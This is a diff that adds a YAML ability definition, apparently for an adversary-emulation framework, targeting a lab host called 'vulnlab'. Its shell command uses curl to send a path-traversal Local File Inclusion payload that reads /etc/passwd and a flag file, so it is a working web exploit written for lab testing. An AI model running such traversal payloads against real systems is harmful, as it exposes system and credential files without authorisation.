@@ -1,0 +1,15 @@
+- id: disc04-lfi-read
+  name: LFI Filesystem Read
+  description: Read sensitive files via Local File Inclusion on vulnlab
+  tactic: discovery
+  technique:
+    attack_id: T1083
+    name: File and Directory Discovery
+  platforms:
+    linux:
+      sh:
+        command: |
+          curl -s 'http://10.0.20.21:9001/?vuln=lfi&file=../../../../etc/passwd' 2>/dev/null | grep -E 'root:|www-data:|ansible:'; curl -s 'http://10.0.20.21:9001/?vuln=lfi&file=../../../../var/lib/vulnlab/.flag' 2>/dev/null
+
+  singleton: false
+  repeatable: false
